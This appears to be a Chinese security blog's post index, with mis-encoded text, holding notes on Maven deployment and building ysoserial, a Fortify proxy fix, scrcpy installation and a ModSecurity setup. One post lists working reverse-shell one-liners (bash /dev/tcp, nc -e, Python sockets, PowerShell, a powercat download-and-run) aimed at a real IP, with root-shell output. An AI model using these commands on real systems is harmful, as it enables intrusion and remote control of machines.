\target\\classes[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java:æŸäº›è¾“å…¥æ–‡ä»¶ä½¿ç”¨æˆ–è¦†ç›–äº†å·²è¿‡æ—¶çš„APIã€‚[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java:æœ‰å…³è¯¦ç»†ä¿¡æ¯,è¯·ä½¿ç”¨-Xlint:deprecationé‡æ–°ç¼–è¯‘ã€‚[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java:æŸäº›è¾“å…¥æ–‡ä»¶ä½¿ç”¨äº†æœªç»æ£€æŸ¥æˆ–ä¸å®‰å…¨çš„æ“ä½œã€‚[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java:æœ‰å…³è¯¦ç»†ä¿¡æ¯,è¯·ä½¿ç”¨-Xlint:uncheckedé‡æ–°ç¼–è¯‘ã€‚[INFO][INFO]---maven-resources-plugin:2.6:testResources(default-testResources)@jeeplus---[INFO]Using'UTF-8'encodingtocopyfilteredresources.[INFO]skipnonexistingresourceDirectoryG:\\yj-work\\java-code\\jeeplus-open\\src\\test\\resources[INFO][INFO]---maven-compiler-plugin:3.3:testCompile(default-testCompile)@jeeplus---[INFO]Nosourcestocompile[INFO][INFO]---maven-surefire-plugin:2.12.4:test(default-test)@jeeplus---[INFO]Noteststorun.[INFO][INFO]---maven-war-plugin:2.2:war(default-war)@jeeplus---[INFO]Packagingwebapp[INFO]Assemblingwebapp[jeeplus]in[G:\\yj-work\\java-code\\jeeplus-open\\target\\jeeplus][INFO]Processingwarproject[INFO]Copyingwebappresources[G:\\yj-work\\java-code\\jeeplus-open\\src\\main\\webapp][INFO]Webappassembledin[19918msecs][INFO]Buildingwar:G:\\yj-work\\java-code\\jeeplus-open\\target\\jeeplus.war[INFO]WEB-INF\\web.xmlalreadyadded,skipping[INFO]------------------------------------------------------------------------[INFO]BUILDSUCCESS[INFO]------------------------------------------------------------------------[INFO]Totaltime:38.071s[INFO]Finishedat:2020-01-19T16:49:31+08:00[INFO]------------------------------------------------------------------------è¿ç€buildsuccessï¼å¯çœŸæ˜¯ä»¤äººæ¿€åŠ¨ï¼›æˆ‘ä»¬å¯ä»¥çœ‹åˆ°mavenå·²ç»æ„å»ºå¥½äº†tomcatéƒ¨ç½²æ‰€éœ€è¦çš„waråŒ…ï¼š[INFO]Buildingwar:G:\\yj-work\\java-code\\jeeplus-open\\target\\jeeplus.warï¼Œç›´æ¥å»å¯¹åº”çš„ç»å¯¹è·¯å¾„ï¼ŒæŠŠwaråŒ…ctrl+cåˆ°tomcatçš„webappæ–‡ä»¶å¤¹é‡Œå°±å¥½äº†ã€‚è‡³æ­¤éƒ¨ç½²å®Œæ¯•ï¼Œå¯¹é¡¹ç›®æŸ¥çœ‹ä¸€ä¸‹ï¼Œæ˜¯å¦å·²ç»éƒ¨ç½²æˆåŠŸã€‚#1x04Mavenï¼šPOMFailedtoreadfrom/tojenkinsFailedtoreadartifactdescriptorforysoserial:ysoserial:jar:0.0.6-SNAPSHOT:Couldnottransferartifactysoserial:ysoserial:pom:0.0.6-SNAPSHOTfrom/tojenkins(http://repo.jenkins-ci.org/public/)ä¸€èˆ¬æƒ…å†µä¸ºæŒ‡å®šçš„Mavenä»“åº“æˆ–è€…æœ¬åœ°ä»“åº“ä¸­éƒ½æ²¡æœ‰pomæŒ‡å®šçš„jaråŒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨æœ¬åœ°ç¼–è¯‘å¥½åæ”¾å…¥æœ¬åœ°ä»“åº“ï¼›pomï¼š&lt;dependency&gt;&lt;groupId&gt;ysoserial&lt;/groupId&gt;&lt;artifactId&gt;ysoserial&lt;/artifactId&gt;&lt;version&gt;0.0.6-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt;ç¼–è¯‘ï¼š$gitclonegit@github.com:frohoff/ysoserial.git$cdysoserial$mvninstall-DskipTests$mvninstall:install-file-Dfile=/{path/to}/ysoserial-0.0.6-SNAPSHOT-all.jar-DgroupId=ysoserial-DartifactId=ysoserial-Dversion=0.0.6-SNAPSHOT-Dpackaging=jaræœ€åçš„ä¸€æ¡å‘½ä»¤groupId/artifactId/versionä¸xmlé…ç½®æ–‡ä»¶ç›¸äº’å¯¹åº”å³å¯ã€‚äºŒï¼šéªŒè¯å¤šè¯´æ— ç›Šï¼Œä¸Šä»£ç ï¼šè¿›å…¥tomcat/bin/ç›®å½•ï¼Œå¯åŠ¨tomcatPSE:\\java\\tomcat\\apache-tomcat-8.5.50\\bin&gt;.\\startup.batUsingCATALINA_BASE:\"E:\\java\\tomcat\\apache-tomcat-8.5.50\"UsingCATALINA_HOME:\"E:\\java\\tomcat\\apache-tomcat-8.5.50\"UsingCATALINA_TMPDIR:\"E:\\java\\tomcat\\apache-tomcat-8.5.50\\temp\"UsingJRE_HOME:\"C:\\ProgramFiles\\Java\\jdk1.8.0_231\\jre\"UsingCLASSPATH:\"E:\\java\\tomcat\\apache-tomcat-8.5.50\\bin\\bootstrap.jar;E:\\java\\tomcat\\apache-tomcat-8.5.50\\bin\\tomcat-juli.jar\"éªŒè¯æ˜¯å¦éƒ¨ç½²æˆåŠŸï¼š&gt;curllocalhost/jeeplusï¼šPSE:\\java\\tomcat\\apache-tomcat-8.5.50\\bin&gt;curllocalhost/jeeplusStatusCode:200StatusDescription:Content:&lt;!DOCTYPEhtml&gt;&lt;html&gt;&lt;head&gt;&lt;metaname=\"description\"content=\"Userloginpage\"/&gt;&lt;metaname=\"viewport\"content=\"width=device-width,initial-scale=1.0\"/&gt;&lt;scriptsrc=\"/jeeplus...RawContent:HTTP/1.1200Content-Language:zh-CNContent-Length:19162Content-Type:text/html;charset=UTF-8Date:Sun,19Jan202009:23:26GMTParsedHtml:mshtml.HTMLDocumentClassRawContentLength:19162å¦‚ä¸Šï¼Œéƒ¨ç½²æˆåŠŸã€‚è¿”å›çŠ¶æ€å€¼200ã€‚å…¶ä»–ä¸Šé¢æ˜¯Mavenåˆ›å»ºä¸€ä¸ªæ ‡å‡†åŒ–çš„Javaé¡¹ç›®ï¼Œä¸¾ä¾‹ï¼šå³éƒ¨ç½²ä¸€ä¸ªmavençš„é¡¹ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šé¢çš„æ–¹å¼æ¥è¿›è¡Œã€‚æ›´å¤šæ—¶å€™ï¼Œå¯¹äºæˆ‘æ¥è¯´ï¼Œæˆ‘é«˜é¢‘ç‡ä½¿ç”¨mavenæ˜¯åœ¨å¯¹äºæ¼æ´çš„éªŒè¯å’Œåˆ©ç”¨é˜¶æ®µï¼Œå³ç½‘ä¸Šå…¬å¼€çš„javapocä»£ç è¯¸å¦‚æ­¤ç±»ï¼Œæ˜¾è€Œæ˜“è§æˆ‘æ›´å€¾å‘äºä½¿ç”¨javaçš„pocä»£ç è€Œépythonä»£ç ã€‚è€Œç”±äºpythonè¯­è¨€æœ¬èº«çš„ä¼˜åŠ¿ï¼Œçºµè§‚ç½‘ä¸Šå¾ˆå¤špythonpocåœ¨æˆ‘çœ‹æ¥ï¼Œå¯¹äºæˆ‘ä»¬ç†è§£æ¼æ´åŸç†æœ¬èº«æ— å®é™…æ„ä¹‰ï¼Œæˆ‘å¹¶ä¸æ˜¯è¯´pythonçš„pocä»£ç ä¸å¥½ï¼Œè€Œæ˜¯è¿™é—¨è¯­è¨€å¤ªä¾¿åˆ©äº†ä»¥è‡³äºæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿å»å¤ç°ä¸€ä¸ªæ¼æ´ï¼Œè¿™æ ·ä¼šå¯¼è‡´äººä»¬å°¤å…¶æ˜¯åˆšå…¥é—¨çš„å°ç™½å¾ˆå°‘å»æ€è€ƒç”šè‡³ä¸æ€è€ƒã€‚å‚è€ƒMavenå®‰è£…æœ¬åœ°jaråŒ…åˆ°æœ¬åœ°ä»“åº“GithubÂ·shiyueqi/kafka-deserialization-bugKafkaååºåˆ—åŒ–æ¼æ´åˆ†æideaæ‰“åŒ…çš„jarè¿è¡ŒæŠ¥â€œXXXä¸­æ²¡æœ‰ä¸»æ¸…å•å±æ€§â€ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "ã€Œç¬”è®°ã€ï¼šfortify-error-no-rules-file-found",
    "category" : "",
    "tags"     : "ä»£ç å®¡è®¡, ç¬”è®°",
    "url"      : "/blog/2020/fortify/no-fules-file/found/",
    "date"     : "Jan 7, 2020",
    "content"  : "æœ€è¿‘åœ¨æ¥è§¦ä»£ç å®¡è®¡çš„æ´»å„¿ã€‚ç¢°åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œéšæ‰‹è®°å½•ä¸‹æ¥ï¼›é”™è¯¯æè¿°ï¼šå½“fortifyå¼€å§‹javaä»£ç åˆ†ææ—¶ï¼ŒæŠ¥é”™Norulesfilesfound;1.é”™è¯¯æè¿°è°·æ­Œä¸€æ³¢å…³é”®è¯[error]:Norulesfilesfoundï¼šé—®é¢˜å¼•å‡ºstackoverflowåŸé—®é¢˜ï¼šWhenIrunaFortifyanalysisagainstaJavaprojectIreceivethiserror:[warning]:Norulesfilesfound[error]:NorulesfilesfoundWherecanIconfiguretherulesfile?åŸç­”æ¡ˆï¼šNavigatetothebinfolderofyourfortifyinstallationEnterscapostinstallEnter2toselectSettingsEnter2toselectProxyServerHostEnterthenameoftheproxyserverEnter3toselectProxyServerPort.Entertheproxyserverâ€™sportnumber.Exitandrunfortifyupdate.cmdåŸç­”æ¡ˆçš„æ„æ€å°±æ˜¯è¯´éœ€è¦å¯¹fortifyè¿›è¡Œä»£ç†é…ç½®ï¼Œ(éœ€ç§‘å­¦ä¸Šç½‘)åè¿›è¡Œè§„åˆ™åº“çš„ä¸‹è½½é…ç½®ã€‚2.è§£å†³é—®é¢˜é…ç½®ä»£ç è¿›å…¥fortifyå®‰è£…çš„ç›®å½•ï¼Œå¯¹fortifyè¿›è¡Œä»£ç†é…ç½®ï¼Œé…ç½®è¿‡ç¨‹ä»£ç å¦‚ä¸‹ï¼š#è¿›å…¥fortifyçš„å®‰è£…ç›®å½•(windowsç¯å¢ƒ)E:cdfortify\\bin\\E:\\fortify\\bin&gt;scapostinstall[1]Migration...[2]Settings...[s]Displayallsettings[q]ExitPleaseselectthedesiredaction(1,2,s,q):2[1]General...[2]FortifyUpdate...[3]SoftwareSecurityCenterSettings...[s]Displayallsettings[r]Return[q]ExitPleaseselectthedesiredaction(1,2,3,s,r,q):2[1]UpdateServerURL[2]ProxyServerHost[3]ProxyServerPort[4]ProxyServerUsername[5]ProxyServerPassword[s]Displayallsettings[r]Return[q]ExitPleaseselectthedesiredaction(1,2,3,4,5,s,r,q):2ProxyServerHost[default:]:localhost[1]UpdateServerURL[2]ProxyServerHost[3]ProxyServerPort[4]ProxyServerUsername[5]ProxyServerPassword[s]Displayallsettings[r]Return[q]ExitPleaseselectthedesiredaction(1,2,3,4,5,s,r,q):3ProxyServerPort[default:]:8080[1]UpdateServerURL[2]ProxyServerHost[3]ProxyServerPort[4]ProxyServerUsername[5]ProxyServerPassword[s]Displayallsettings[r]Return[q]ExitPleaseselectthedesiredaction(1,2,3,4,5,s,r,q):qä»¥ä¸Šfortifyå®¢æˆ·ç«¯é…ç½®ä»£ç†ç»“æŸï¼Œç„¶åç›´æ¥è¾“å…¥å‘½ä»¤è¿›è¡Œè§„åˆ™åº“ä¸‹è½½æ›´æ–°ï¼šæ›´æ–°æ–‡ä»¶è¾“å…¥fortifyupdateæ›´æ–°å‘½ä»¤ï¼Œæ›´æ–°ä»£ç å¦‚ä¸‹ï¼šE:\\fortify\\bin&gt;fortifyupdate.cmdUsingproxyserver:localhost:8080StoringUpdatedSecurityContent...E:\\fortify\\Core\\config\\rulesFortifySecureCodingRules,Core,Annotationsv2015.2.0.0008FortifySecureCodingRules,Extended,JSPv2015.2.0.0008FortifySecureCodingRules,Core,ClassicASP,VBScript,andVB6v2015.2.0.0008FortifySecureCodingRules,Core,ActionScript3.0v2015.2.0.0008FortifySecureCodingRules,Core,C/C++v2015.2.0.0008FortifySecureCodingRules,Extended,Javav2015.2.0.0008FortifySecureCodingRules,Core,Androidv2015.2.0.0008FortifySecureCodingRules,Core,COBOLv2015.2.0.0008FortifySecureCodingRules,Extended,C/C++v2015.2.0.0008FortifySecureCodingRules,Core,.NETv2015.2.0.0008FortifySecureCodingRules,CorePreview,ABAPv2014.4.0.0008FortifySecureCodingRules,Extended,Configurationv2015.2.0.0008FortifySecureCodingRules,Extended,Contentv2015.2.0.0008FortifySecureCodingRules,Core,Objective-Cv2015.2.0.0008FortifySecureCodingRules,Core,PHPv2015.2.0.0008FortifySecureCodingRules,Core,ABAPv2015.2.0.0008FortifySecureCodingRules,Extended,SQLv2015.2.0.0008FortifySecureCodingRules,Core,JavaScriptv2015.2.0.0008FortifySecureCodingRules,Core,SQLv2015.2.0.0008FortifySecureCodingRules,Extended,.NETv2015.2.0.0008FortifySecureCodingRules,Core,Javav2015.2.0.0008FortifySecureCodingRules,Core,Rubyv2015.2.0.0008FortifySecureCodingRules,Core,ColdFusionv2015.2.0.0008FortifySecureCodingRules,Core,Pythonv2015.2.0.0008RemovingOldMetadataFiles...E:\\fortify\\Core\\config\\ExternalMetadataMainExternalListMappingsv2019.1.0.0007StoringUpdatedMetadataFiles...E:\\fortify\\Core\\config\\ExternalMetadataMainExternalListMappingsv2015.2.0.0008ç»“æœé…ç½®å®Œå°±å¯ä»¥æ„‰å¿«åœ°ä½¿ç”¨fortifyè¿›è¡Œæœºå™¨æ‰«æåˆ†æä»£ç äº†ã€‚æ•¬ä¸Šã€‚æ„Ÿè°¢æ‚¨çš„é˜…è¯»å‚è€ƒï¼šFortifyError:â€œNorulesfilefoundâ€"
  },

  {
    "title"    : "ã€Œscrcpyã€:Linuxä¸­ä¼˜ç§€çš„æŠ•å±è½¯ä»¶ï½",
    "category" : "",
    "tags"     : "ç¬”è®°",
    "url"      : "/blog/2019/scrcpy/",
    "date"     : "Dec 31, 2019",
    "content"  : "macOS2022/03/30/17:13:08æ·»åŠ macOSç”¨æ³•ç”¨scrcpyä¸»è¦æ˜¯å› ä¸ºå¼€æºä¸”å¹²å‡€ï¼Œå…ˆä¸Šæ•ˆæœå›¾ã€‚å®‰è£…ä¹Ÿå¾ˆç®€å•ï¼šbrewinstallscrcpyä¸è¿‡å½“æ—¶æˆ‘ä¸€ç›´æŠ¥é”™ï¼šError:python@3.9:thebottleneedstheAppleCommandLineToolstobeinstalled.Error:scrcpy:Failedtodownloadresource\"imath\"æ¥å›çš„æŠ¥é”™ï¼Œè€Œä¸”brewçš„cacheä¸‹è½½æ–‡ä»¶å¤¹ä¸€ç›´åœ¨ä¸‹è½½ï¼Œæˆ‘å°±å¾ˆæ…Œï¼›ç„¶ååœ¨çŸ¥ä¹ä¸Šæ‰¾åˆ°@çŸ¥ä¹ç”¨æˆ·çš„å›ç­”ï¼šmacç”¨æˆ·ä½¿ç”¨homebrewå®‰è£…scrcpyæ—¶ï¼Œè¯·æ³¨æ„å¦‚æœä½¿ç”¨äº†å›½å†…æºï¼Œåˆ™æœ‰å¯èƒ½å®‰è£…ä¸åˆ°scrcpyçš„æœ€æ–°ç‰ˆæœ¬ï¼ˆç›®å‰æ˜¯v1.14ï¼‰ï¼Œå¦‚æœå®‰è£…äº†æ—§ç‰ˆæœ¬ï¼Œåˆ™æŸäº›æ‰‹æœºå¯èƒ½æ— æ³•ä½¿ç”¨scrcpyï¼ŒæŠ¥segementerrorã€‚æ‰€ä»¥ï¼Œè¯·ç¡®ä¿èƒ½å®‰è£…åˆ°æœ€æ–°ç‰ˆæœ¬çš„scrcpyï¼š1ã€ä½¿ç”¨é»˜è®¤æºï¼›2ã€ä½¿ç”¨åœ°å€ç›´æ¥å®‰è£…ç‰¹å®šç‰ˆæœ¬ï¼›3ã€å®‰è£…å®Œæˆåï¼Œä½¿ç”¨brewinfoscrcpyï¼Œç¡®è®¤ä¸€ä¸‹ç‰ˆæœ¬ã€‚è±ç„¶å¼€æœ—ï¼›ç›´æ¥ä¿®æ”¹é»˜è®¤æºåœ¨ä¸‹è½½å°±å¥½äº†ï¼šgit-C\"$(brew--repo)\"remoteset-urlorigin'https://github.com/Homebrew/brew.git'git-C\"$(brew--repohomebrew/core)\"remoteset-urlorigin'https://github.com/Homebrew/homebrew-core.git'git-C\"$(brew--repohomebrew/cask)\"remoteset-urlorigin'https://github.com/Homebrew/homebrew-cask.git'brewupdateinfo:$brewinfoscrcpyscrcpy:stable1.23(bottled)DisplayandcontrolyourAndroiddevicehttps://github.com/Genymobile/scrcpy/usr/local/Cellar/scrcpy/1.23(10files,295.9KB)*Pouredfrombottleon2022-03-30at16:51:20From:https://github.com/Homebrew/homebrew-core/blob/HEAD/Formula/scrcpy.rbLicense:Apache-2.0Linux#aptinstallsnapdæ­£åœ¨è¯»å–è½¯ä»¶åŒ…åˆ—è¡¨...å®Œæˆæ­£åœ¨åˆ†æè½¯ä»¶åŒ…çš„ä¾èµ–å…³ç³»æ ‘æ­£åœ¨è¯»å–çŠ¶æ€ä¿¡æ¯...å®Œæˆsnapdå·²ç»æ˜¯æœ€æ–°ç‰ˆ(2.42.1-1)ã€‚å‡çº§äº†0ä¸ªè½¯ä»¶åŒ…ï¼Œæ–°å®‰è£…äº†0ä¸ªè½¯ä»¶åŒ…ï¼Œè¦å¸è½½0ä¸ªè½¯ä»¶åŒ…ï¼Œæœ‰26ä¸ªè½¯ä»¶åŒ…æœªè¢«å‡çº§sudosnapinstallscrcpy.snap--dangerousç”±äºç›´æ¥è®¾ç½®http_proxyç¯å¢ƒå˜é‡æ— æ³•è®¾ç½®ä¸Š,ä½œè€…åœ¨snapdä¸­ç›´æ¥è®¾ç½®proxy,æ–¹æ³•å¦‚ä¸‹:#å‰ç½®æ“ä½œ,ä¿®æ”¹systemctleditä½¿ç”¨çš„ç¼–è¾‘å™¨ä¸ºVIM,å¦‚æœä¸ä»‹æ„Nanoå¯ä»¥è·³è¿‡è¿™ä¸€æ­¥$sudotee-a/etc/profile&lt;&lt;-'EOF'exportSYSTEMD_EDITOR=\"/bin/vim\"EOF$source/etc/profile#å¼€å§‹è®¾ç½®ä»£ç†$sudosystemctleditsnapd#åŠ ä¸Šï¼š[Service]Environment=\"http_proxy=http://127.0.0.1:port\"Environment=\"https_proxy=http://127.0.0.1:port\"$sudosystemctldaemon-reload$sudosystemctlrestartsnapdå®æµ‹ç›¸å½“æœ‰æ•ˆroot@kali:/usr/local/scrcpy-test/scrcpy#sudosnapinstallscrcpy2019-12-31T11:28:41+08:00INFOWaitingforrestart...Downloadsnap\"core18\"(1288)fromchannel\"stable\"11%14.7kB/s57.7m^C^C^Z[2]+å·²åœæ­¢sudosnapinstallscrcpyå¦‚ä¸Šä¸‹æ‰€ç¤ºï¼Œé€Ÿåº¦å¿«äº†åå€ï½åå€çš„å¿«ä¹ï½root@kali:/usr/local/scrcpy-test/scrcpy#sudosnapinstallscrcpy2019-12-31T11:36:30+08:00INFOWaitingforrestart...Downloadsnap\"scrcpy\"(199)fromchannel\"stable\"7%129kB/s9m51sWarning:/snap/binwasnotfoundinyour$PATH.Ifyou'venotrestartedyoursessionsinceyouinstalledsnapd,trydoingthat.Pleaseseehttps://forum.snapcraft.io/t/9469formoredetails.scrcpyv1.12fromsisco311installedscrcpyæŠ•å±éœ€è¦usbè°ƒè¯•æƒé™ï¼›å…·ä½“æ­¥éª¤ä¸º[å¼€å‘è€…æ¨¡å¼]-[æ‰“å¼€usbè°ƒè¯•]å¦åˆ™ä¼šæŠ¥é”™ï¼šroot@kali:~#scrcpyINFO:scrcpy1.12&lt;https://github.com/Genymobile/scrcpy&gt;adb:error:failedtogetfeatureset:nodevices/emulatorsfoundERROR:\"adbpush\"returnedwithvalue10x01å…¶ä»–æŠ¥é”™root@kali:/snap/bin#./scrcpycannotchangeprofileforthenextexeccall:Nosuchfileordirectorysnap-update-nsfailedwithcode1:Nosuchfileordirectory#æŸ¥çœ‹ç‰ˆæœ¬ï¼šroot@kali:~#snapversionsnap2.42.5snapd2.42.5series16kali2019.4kernel5.3.0-kali3-amd64root@kali:~#snapversionsnap2.42.5snapd2.42.5series16kali2019.4kernel5.3.0-kali3-amd64è§£å†³ï¼šroot@kali:/var/lib/snapd/apparmor/profiles#apparmor_parser-r/var/lib/snapd/apparmor/profiles/å‚è€ƒsnapInstall.md;snapå®‰è£…è¿‡æ…¢è§£å†³æ–¹æ¡ˆSnap-update-nsfailing,cannotlaunchsnaps;linuxé‡å¯åå¯åŠ¨scrcpyï¼ŒsnapæŠ¥é”™@çŸ¥ä¹ç”¨æˆ·HomebrewæŸ¥çœ‹å¹¶ä¿®æ”¹æºé…ç½®"
  },

  {
    "title"    : "ã€Œç¬”è®°ã€ï¼šåå¼¹shellçš„å‡ ç§æ–¹æ³•",
    "category" : "",
    "tags"     : "å®‰å…¨å·¥å…·, æ¸—é€, ç¬”è®°",
    "url"      : "/blog/2019/shell/reserve/back/",
    "date"     : "Dec 30, 2019",
    "content"  : "è®°å½•ï¼šå…³äºbashshellçš„åå¼¹:)éšç¬”è®°å‡å®šç¯å¢ƒï¼škaliè¢«æ”»å‡»æœºå™¨ï¼›ip:192.168.3.32iZj6cgn7odv59wmjjhe6zwZæ”»å‡»æœºï¼›ip:47.52.233.921.bashroot@kali:/#bash-i&gt;&amp;/dev/tcp/47.52.233.92/12340&gt;&amp;1root@iZj6cgn7odv59wmjjhe6zwZ:~#nc-lvvp1234Listeningon[0.0.0.0](family0,port1234)Connectionfrom223.240.212.23637798received!root@kali:/#whoamiwhoamirootroot@kali:/#ifconfigifconfigeth0:flags=4099&lt;UP,BROADCAST,MULTICAST&gt;mtu1500ether1c:39:47:e5:d0:0dtxqueuelen1000(Ethernet)RXpackets0bytes0(0.0B)RXerrors0dropped0overruns0frame0TXpackets0bytes0(0.0B)TXerrors0dropped0overruns0carrier0collisions0lo:flags=73&lt;UP,LOOPBACK,RUNNING&gt;mtu65536inet127.0.0.1netmask255.0.0.0inet6::1prefixlen128scopeid0x10&lt;host&gt;looptxqueuelen1000(LocalLoopback)RXpackets132196bytes121378334(115.7MiB)RXerrors0dropped0overruns0frame0TXpackets132196bytes121378334(115.7MiB)TXerrors0dropped0overruns0carrier0collisions0wlan0:flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;mtu1500inet192.168.3.32netmask255.255.255.0broadcast192.168.3.255inet6fe80::c895:5ca5:529a:eef3prefixlen64scopeid0x20&lt;link&gt;ether68:07:15:d5:46:16txqueuelen1000(Ethernet)RXpackets140963bytes101469044(96.7MiB)RXerrors0dropped15overruns0frame0TXpackets86373bytes16895892(16.1MiB)TXerrors0dropped0overruns0carrier0collisions02.netcatroot@kali:/#nc-e/bin/sh47.52.233.921234root@iZj6cgn7odv59wmjjhe6zwZ:~#nc-lvvp1234Listeningon[0.0.0.0](family0,port1234)Connectionfrom223.240.212.23637812received!python-c'importpty;pty.spawn(\"/bin/sh\")'#whoamiwhoamiroot#3.pythonroot@kali:/#python-c'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"47.52.233.92\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'root@iZj6cgn7odv59wmjjhe6zwZ:~#nc-lvvp1234Listeningon[0.0.0.0](family0,port1234)Connectionfrom223.240.212.23637820received!#whoamiroot#iduid=0(root)gid=0(root)ç»„=0(root)4.powershellæ„é€ å‡½æ•°åå¼¹shellå®é™…åå¼¹shellä¸­æˆåŠŸçš„ï¼›åº”ç”¨åœºæ™¯ï¼š1.WINDOWSç³»ç»Ÿ2.ä¸Šä¼ æœ¨é©¬æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰äº¤äº’å¼shellpowershell.exe-nop-c\"$client=New-ObjectNet.Sockets.TCPClient('117.64.238.192',11223);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){;$data=(New-Object-TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex$data2&gt;&amp;1|Out-String);$sendback2=$sendback+'PS'+(pwd).Path+'&gt;';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"powershellIEX(New-ObjectSystem.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat-c47.52.233.92-p11223-ecmdmeterpreterå¯ä»¥ç›´æ¥å¼€å¯rungetui-eç„¶åç”¨rdesktopå°±èƒ½ç›´æ¥è¿äº†"
  },

  {
    "title"    : "Mod-Securityï¼šæœ‰å…³ã€ŒWAFã€çš„çˆ±æ¨æƒ…ä»‡",
    "category" : "",
    "tags"     : "ç¬”è®°, Web, WAF",
    "url"      : "/blog/2019/ABOUT/Modsec/waf/",
    "date"     : "Dec 25, 2019",
    "content"  : "æ·»åŠ äº2021/02/05â€œæœèŠ±å¤•æ‹¾â€è¿™ç¯‡ä¸WAFç›¸å…³ã€ŠæŠ€æœ¯ã€‹åšå®¢å…¶å®æ²¡æœ‰å¤šå°‘æŠ€æœ¯å«é‡ï¼Œåªæ˜¯å½“æ—¶åˆšåˆšæ¥è§¦åˆ°WAFï¼Œæ„Ÿè§‰éå¸¸çš„æ–°é²œç„¶åæœ‰äº†è¿™ç¯‡åšå®¢ï¼Œå…¶å®å½“æ—¶è¿LINUXåŸºç¡€å¸¸è¯†éƒ½è¿˜ä¸æ˜¯éå¸¸çš„äº†è§£ï¼Œå¹´å°‘è½»ç‹‚çš„æ¥é…ç½®WAFè‚¯å®šæ— æ³•æˆåŠŸï¼›ç°åœ¨å›å¤´æ¥çœ‹å½“æ—¶çš„æ–‡ç¬”è¿˜æ˜¯è¾ƒä¸ºç¨šå«©ï¼Œé€šç¯‡éƒ½æ˜¯ä¸€äº›â€è½¬è¿°â€çš„ä»£ç å—ï¼Œæ²¡æœ‰è‡ªå·±çš„ç›¸å…³æ€æƒ³ï¼Œæ˜¯å¾ˆç³Ÿç³•çš„ä¸€ç¯‡åšå®¢ã€‚åˆšå¥½å¹´åº•æ€»ç»“åšå®¢ï¼Œæ€»ç»“åˆ°WAFè¿™ä¸€å—ï¼Œæ­£å¥½æŠŠè¿™ä¸€ç¯‡çš„æ–‡ç« ç»™è¡¥ä¸Šï¼Œæ•´ç†æ–‡ç« å¯ä»¥æŸ¥çœ‹ï¼Œè¾ƒäºä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œä¸»è¦å¢åŠ äº†è‡ªå®šä¹‰è§„åˆ™åº“çš„é…ç½®å’Œç›¸å…³éªŒè¯ï¼Œå¯é€šè¿‡ä¸Šæ–¹ç›®å½•é“¾æ¥ç›´æ¥è·³è½¬ï¼šã€Œåˆ†äº«ã€ModsecWAFï¼šè€ç‰Œå¼€æºwafçš„ç»•è¿‡å†ç¨‹æ­£å¥½æŠŠè¿™ç¯‡æ–‡ç« æ”¶ä¸ªå°¾ï¼Œæˆ‘çš„æœ‰äº›æ–‡ç« å†™åˆ°ä¸€åŠï¼Œå†™ä¸ä¸‹å»äº†å°±æ”¾ç€äº†ã€‚è¿™ä¸ªä¹ æƒ¯ä¸æ˜¯å¾ˆå¥½ã€‚è®°ä¸€æ¬¡wafé…ç½®ç»å†ã€‚å¿™é‡Œå·é—²ï¼Œæ­£å¥½æœ‰é—²ç½®çš„æœåŠ¡å™¨ï¼Œè‡ªå·±åŠ¨åŠ¨æ‰‹é…ç½®çœ‹çœ‹ã€‚äº2022-10-20ä¿®æ”¹1.è¿è¡Œç¯å¢ƒnginx-1.14.0ï¼ˆaptè‡ªåŠ¨åŒ–å®‰è£…ï¼‰ç»è¿‡å®é™…æ“ä½œéªŒè¯ï¼Œè¿™é‡Œå»ºè®®å„ä½ä½¿ç”¨nginx1.13.8ç‰ˆæœ¬ï¼›æºç åŒ…ä¸‹è½½é“¾æ¥wgethttp://nginx.org/download/nginx-1.13.8.tar.gzubuntu18.042.å®‰è£…é…ç½®å®‰è£…çš„è¿‡ç¨‹å¤§è‡´æ˜¯è¿™æ ·çš„ä¸€ä¸ªè¿‡ç¨‹ï¼š1ã€ModWAFç¼–è¯‘å®‰è£…nginxç‰ˆæœ¬ï¼Œæ•™ç¨‹ä¸­æ¨èçš„1.9ç‰ˆæœ¬å®é™…æ“ä½œä¸‹æ¥æ— æ³•æˆåŠŸåœ¨UBUNTU18ä¸‹ç¼–è¯‘å®‰è£…ï¼Œè¿™é‡Œæ¨ènginx/1.13.8æˆ–è€…æ›´é«˜ï¼ŒæåŠ›æ¨ènginx/1.18.0wgethttp://nginx.org/download/nginx-1.13.8.tar.gzç¯å¢ƒlibåº“å®‰è£…ï¼šsudoapt-getinstallopenssllibssl-devlibpcre3libpcre3-devzlib1g-devautoconfautomakelibtoolgccg++makegitclonehttps://github.com/SpiderLabs/ModSecurity2ã€ç¼–è¯‘å®‰è£…NGINXæ³¨æ„ç¼–è¯‘å®‰è£…æ—¶æ·»åŠ 